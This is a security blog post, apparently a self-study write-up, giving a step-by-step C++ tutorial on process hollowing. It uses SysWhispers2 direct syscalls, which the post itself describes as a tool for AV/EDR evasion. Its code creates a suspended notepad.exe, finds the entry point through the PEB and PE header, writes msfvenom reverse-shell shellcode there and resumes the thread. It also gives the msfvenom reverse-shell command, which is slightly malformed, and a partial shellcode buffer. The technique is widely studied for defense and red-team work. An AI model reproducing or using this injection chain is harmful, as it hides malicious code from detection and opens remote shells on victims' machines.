<!DOCTYPE html>
<html lang="en" color-mode="dark">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="KageHayashi" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      Process Injection with Direct Syscalls 
      
      
      |
    
     KageHayashi
  </title>

  
    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
    <link rel="icon" href="/images/takeda_white_small.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.1.1"></head>


  <body>
    <div id="app">
      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">

<div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img id="author_photo" src="/images/dark.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">KageHayashi</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/cheatsheets/">
          <a href="/cheatsheets/">Cheat Sheets</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">Process Injection with Direct Syscalls</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2024-03-11 15:56:54
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="Tags"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/Malware/" title="Malware">
                    #Malware
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>This post is to help me understand the process hollowing technique and writing C++ code for it using direct syscalls.</p>
<h1 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h1><p>Process Hollowing is a technique often used by malware tool kits to hide malicious code within the presence of a seemingly legitimate process. The basic idea is to inject code into a suspended and hollowed-out process in an attempt to evade detection and defenses.</p>
<p>The basic theory is as follows:</p>
<ol>
<li>Create a process in a suspended state.</li>
<li>Locate the <em>EntryPoint</em> of the executable process.</li>
<li>Overwrite the memory region with our shellcode.</li>
<li>Continue execution.</li>
</ol>
<p>This way, our shell would be executed within a legitimate process like <code>notepad.exe</code> and would be less detectable to an unsuspecting target. </p>
<h1 id="Setting-up-Our-Environment"><a href="#Setting-up-Our-Environment" class="headerlink" title="Setting up Our Environment"></a>Setting up Our Environment</h1><p>Before jumping into the code, we need to set up our environment properly. This step is crucial in getting our direct syscalls to work since some of the APIs we’ll need later on, such as <code>NtQueryInformationProcess</code>, are not associated with a library and can only be accessed through run-time dynamic linking.</p>
<p>We’ll be using <code>Microsoft Visual Studio</code> for our project. Create a new empty <code>C++</code> console app. Here I’ll call the project “ProcessHollowing”. This should produce the following solution structure.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311143940736.png"></p>
<h2 id="MASM-Build-Customization"><a href="#MASM-Build-Customization" class="headerlink" title="MASM Build Customization"></a>MASM Build Customization</h2><p>From here, we need to set up build customizations for assembly files. Right-click on the project and go to <code>Build Dependencies -&gt; Build Customizations...</code><br><img src="/posts/process-hollowing-direct-syscalls/image-20240311144046575.png"></p>
<p>Make sure <code>masm</code> is checked and press Ok.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311144153381.png"></p>
<h2 id="Importing-SysWhisphers2"><a href="#Importing-SysWhisphers2" class="headerlink" title="Importing SysWhisphers2"></a>Importing SysWhisphers2</h2><p>The next step we need to do is download SysWhisphers2. The project is intended for AV&#x2F;EDR evasion via direct system calls, but in this case we’ll just use some of the basic APIs it provides such as the aforementioned <code>NtQueryInformationProcess</code>.</p>
<p>Download the project and run the following command to generate the required files:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python syswhispers.py --preset common -o syscalls_common</span><br></pre></td></tr></table></figure>
<p><img src="/posts/process-hollowing-direct-syscalls/image-20240311144710391.png"></p>
<p>Take note of the <code>syscalls_common.c</code>, <code>syscalls_common.h</code>, and <code>syscalls_common_stubs.std.x64.asm</code> files. Copy&#x2F;move them to the project folder.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311144800366.png"></p>
<p>From here, add the .h and .c&#x2F;.asm files to the project as header and source files, respectively. The resulting project structure should look like this:<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311145057258.png"></p>
<p>Notice the <code>internals.h</code> file as well. This file includes definitions for some structures we’ll need. The contents of this file is:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/internals.h">https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/internals.h</a></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">PROCESS_BASIC_INFORMATION</span> &#123;</span><br><span class="line">	PINT Reserved1;</span><br><span class="line">	PINT PebBaseAddress;</span><br><span class="line">	PINT Reserved2[<span class="number">2</span>];</span><br><span class="line">	PINT UniqueProcessId;</span><br><span class="line">	PINT Reserved3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _NtUnmapViewOfSection)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID BaseAddress</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _NtQueryInformationProcess)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">	PDWORD ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _NtQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">	PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="Include-ASM-File-to-Build"><a href="#Include-ASM-File-to-Build" class="headerlink" title="Include ASM File to Build"></a>Include ASM File to Build</h2><p>Our last step is to properly include the <code>.asm</code> file to our project. Right-click on the file and go to <code>Properties</code>. Make the following changes to our active configuration of <code>x64</code>:</p>
<ul>
<li>Excluded From Build - No</li>
<li>Content - Yes</li>
<li>Item Type - Microsoft Macro Assembler<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311145356386.png"></li>
</ul>
<p>With that, we should be ready to start. Make sure to add the following include statements in <code>main.cpp</code> to use them:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;syscall_common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;internals.h&quot;</span></span></span><br></pre></td></tr></table></figure>
<h1 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h1><h2 id="Create-Process-in-Suspended-State"><a href="#Create-Process-in-Suspended-State" class="headerlink" title="Create Process in Suspended State"></a>Create Process in Suspended State</h2><p>We begin by starting a simple <code>notepad.exe</code> process in a suspended state via the <code>CreateProcessA</code> API. From the Win32 API definition of <code>CreateProcessA</code>:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa</a></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>There are several intricacies within the definition, but what we need to pay attention to is the <code>lpCommandLine</code> and <code>dwCreationFlags</code> parameters.</p>
<ul>
<li><code>lpCommandLine</code> - specifies the command we want to run (in this case, it’s <code>notepad.exe</code>)</li>
<li><code>dwCreationFlags</code> - specifies the priority class and the creation of the process (here, we want to use <code>CREATE_SUSPENDED</code>)</li>
</ul>
<p>We’ll also need to supply the <code>lpStartupInfo</code> and <code>lpProcessInformation</code> parameters, which can be done by instantiating <code>LPSTARTUPINFOA</code> and <code>LPPROCESS_INFORMATION</code> objects. </p>
<p>The following code will create a new <code>notepad.exe</code> in a suspended state:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Create process to be hollowed out - notepad.exe</span></span><br><span class="line">	LPSTARTUPINFOA si = <span class="keyword">new</span> <span class="built_in">STARTUPINFOA</span>(); <span class="comment">// pointer to a STARTUPINFO struct</span></span><br><span class="line">	LPPROCESS_INFORMATION pi = <span class="keyword">new</span> <span class="built_in">PROCESS_INFORMATION</span>(); <span class="comment">// pointer to a PROCESS_INFORMATION struct</span></span><br><span class="line">	<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, si, pi);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>If we run this code and inspect the process in Process Hacker, we can see that the newly created <code>notepad.exe</code> process is in a suspended state (indicated by a gray background).<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311135011203.png"></p>
<h2 id="Getting-EntryPoint-Address"><a href="#Getting-EntryPoint-Address" class="headerlink" title="Getting EntryPoint Address"></a>Getting EntryPoint Address</h2><h3 id="Manually-Getting-the-EntryPoint-in-WinDbg"><a href="#Manually-Getting-the-EntryPoint-in-WinDbg" class="headerlink" title="Manually Getting the EntryPoint in WinDbg"></a>Manually Getting the EntryPoint in WinDbg</h3><p>Now that we have the process in a suspended state, we need to find out its <em>EntryPoint</em> address. This is the starting address of the PE file and execution starts here. We can try to understand this manually first. </p>
<p>Attach the suspended <code>notepad.exe</code> process in <code>WinDbg</code> and get the location of the image base address from the Process Environment Block (PEB) - a data structure that contains data about a process. This is the base address at which the image of the process is loaded into memory. For us, the address is <code>00007ff676050000</code>.</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!peb</span><br></pre></td></tr></table></figure>
<p><img src="/posts/process-hollowing-direct-syscalls/image-20240311135550248.png"></p>
<p>We can also see that the base address is at an offset of <code>0x10</code> from the PEB</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt _peb @$peb</span><br></pre></td></tr></table></figure>
<p><img src="/posts/process-hollowing-direct-syscalls/image-20240311135729779.png"></p>
<p>If we display more PE header information at that base address, we can see that the address of the entry point has a relative address of <code>23E50</code> from this base.</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!dh 0x00007ff6`76050000</span><br></pre></td></tr></table></figure>
<p><img src="/posts/process-hollowing-direct-syscalls/image-20240311135927188.png"></p>
<p>We can confirm by directly disassembling the entry point:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u $exentry</span><br></pre></td></tr></table></figure>
<p><img src="/posts/process-hollowing-direct-syscalls/image-20240311140039956.png"></p>
<p>We can see that:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00007ff6`76073e50 - 0x00007ff6`76050000 = 23E50</span><br></pre></td></tr></table></figure>

<p>Thus, we have found our entry point address at <code>00007ff676073e50</code>, with a relative address of <code>23E50</code> from the base image. Now, let’s see if we can mathematically calculate this address in code. </p>
<h3 id="Getting-the-EntryPoint-with-Code"><a href="#Getting-the-EntryPoint-with-Code" class="headerlink" title="Getting the EntryPoint with Code"></a>Getting the EntryPoint with Code</h3><p>Using our good friend Wikipedia, we can try to understand the PE file structure a little better</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Portable_Executable">https://en.wikipedia.org/wiki/Portable_Executable</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Portable_Executable#/media/File:Portable_Executable_32_bit_Structure_in_SVG_fixed.svg">https://en.wikipedia.org/wiki/Portable_Executable#/media/File:Portable_Executable_32_bit_Structure_in_SVG_fixed.svg</a></li>
</ul>
<p>We can start by assuming we have the PEB address of the process. From this, we know that the base image address is at an offset of <code>0x10</code>. Reading the value at this offset, we get the base image address.</p>
<p>From here, we know that the pointer to the PE header is located at an offset of <code>0x3C</code> from the image base.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311141302666.png"></p>
<p>The entry point address is at an offset of <code>0x28</code> from the PE header.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311141350005.png"></p>
<p>Mathematically, the formula is:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;entry_point_addr&gt; = read(&lt;base_image_addr&gt; + 0x3C) + 0x28</span><br><span class="line">                   = read(read(&lt;PEB_addr&gt; + 0x10) + 0x3C) + 0x28</span><br></pre></td></tr></table></figure>

<p>With that, we need code that can help us:</p>
<ul>
<li>Locate the PEB of the process (<code>NtQueryInformationProcess</code>)</li>
<li>Read the memory from the remote process (<code>NtReadVirtualMemory</code>)</li>
</ul>
<p>To locate the image base of our <code>notepad.exe</code> process, we can add the following:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get process ID</span></span><br><span class="line">DWORD pid = pi-&gt;dwProcessId;</span><br><span class="line">HANDLE hProcess = pi-&gt;hProcess;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Created notepad.exe process ID at: %d\r\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calculate PEB and image base offset</span></span><br><span class="line">PROCESS_BASIC_INFORMATION* pbi = <span class="keyword">new</span> <span class="built_in">PROCESS_BASIC_INFORMATION</span>();</span><br><span class="line">ULONG retLen = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">NtQueryInformationProcess</span>(hProcess, ProcessBasicInformation, pbi, <span class="built_in">sizeof</span>(PROCESS_BASIC_INFORMATION), &amp;retLen);</span><br><span class="line">PINT ImageBaseOffset = (PINT)((INT64)pbi-&gt;PebBaseAddress + <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Offset found at: %p\r\n&quot;</span>, ImageBaseOffset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read address of image base</span></span><br><span class="line">PINT lpImageBaseAddress = <span class="number">0</span>;</span><br><span class="line">SIZE_T bytesRead = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">NtReadVirtualMemory</span>(hProcess, ImageBaseOffset, &amp;lpImageBaseAddress, <span class="built_in">sizeof</span>(lpImageBaseAddress), &amp;bytesRead);</span><br><span class="line"><span class="comment">//printf(&quot;[+] Read %lld bytes\r\n&quot;, bytesRead);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Address found at: %p\r\n&quot;</span>, lpImageBaseAddress);</span><br></pre></td></tr></table></figure>

<p>Run this and we should be able to find the image base address.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311151420392.png"></p>
<p>Next, to read the entry point address:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read 0x200 bytes from the base image to parse the PE header</span></span><br><span class="line">CHAR data[<span class="number">0x200</span>]; </span><br><span class="line">SIZE_T bytesRead1 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">NtReadVirtualMemory</span>(hProcess, lpImageBaseAddress, &amp;data, <span class="built_in">sizeof</span>(data), &amp;bytesRead1);</span><br><span class="line"><span class="comment">//printf(&quot;[+] Read %lld bytes from base image\r\n&quot;, bytesRead1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract the e_lfanew offset at 0x3C - this should hold the address value to the start of the PE header</span></span><br><span class="line"><span class="type">char</span> extractedBytes[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(extractedBytes, data + <span class="number">0x3C</span>, <span class="number">4</span>);</span><br><span class="line"><span class="type">int</span> extractedInteger = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(extractedBytes);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] e_lfanew offset at: 0x%x\r\n&quot;</span>, extractedInteger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add 0x28 to get to the offset of the entrypoint RVA.</span></span><br><span class="line"><span class="type">int</span> opthdr = extractedInteger + <span class="number">0x28</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA offset found at: %x\r\n&quot;</span>, opthdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract entrypoint RVA value</span></span><br><span class="line"><span class="type">char</span> entrypoint[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(entrypoint, data + opthdr, <span class="number">4</span>);</span><br><span class="line"><span class="type">int</span> entrypoint_rva = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(entrypoint);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA value found at: %x\r\n&quot;</span>, entrypoint_rva);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get entrypoint address</span></span><br><span class="line">PINT addressOfEntryPoint = (PINT)(entrypoint_rva + (INT64)lpImageBaseAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint Address found at: %p\r\n&quot;</span>, addressOfEntryPoint);</span><br></pre></td></tr></table></figure>
<p><img src="/posts/process-hollowing-direct-syscalls/image-20240311151626097.png"></p>
<p>Now we’ve found the entry point address, we can attempt to “hollow” out the memory and overwrite it with our own shellcode.</p>
<h3 id="Overwriting-the-Memory"><a href="#Overwriting-the-Memory" class="headerlink" title="Overwriting the Memory"></a>Overwriting the Memory</h3><p>First, we generate shellcode for a reverse shell with <code>msfvenom</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=4444 -f c</span><br></pre></td></tr></table></figure>
<p><img src="/posts/process-hollowing-direct-syscalls/image-20240311152124992.png"></p>
<p>Then, we will use the following code to write it to memory and resume the thread:</p>
<ul>
<li><code>WriteProcessMemory</code> - to overwrite the entry point memory</li>
<li><code>ResumeThread</code> - to resume thread execution</li>
</ul>
<p><code>WriteProcessMemory</code>, which has the following definition:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</a></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] SIZE_T  *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>ResumeThread</code>, which has the following definition:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread</a></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">ResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE hThread</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>To execute the shellcode, use the following code:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// msfvenom -p windows/x64/shell_reverse_tcp LHOST=4444 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line">	<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line">	<span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line">	....</span><br><span class="line"></span><br><span class="line">SIZE_T nnRead = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, addressOfEntryPoint, buf, <span class="built_in">sizeof</span>(buf), &amp;nnRead);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Wrote %lld bytes to entry point\r\n&quot;</span>, nnRead);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi-&gt;hThread);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Thread resumed. Shellcode executed\r\n&quot;</span>);</span><br></pre></td></tr></table></figure>

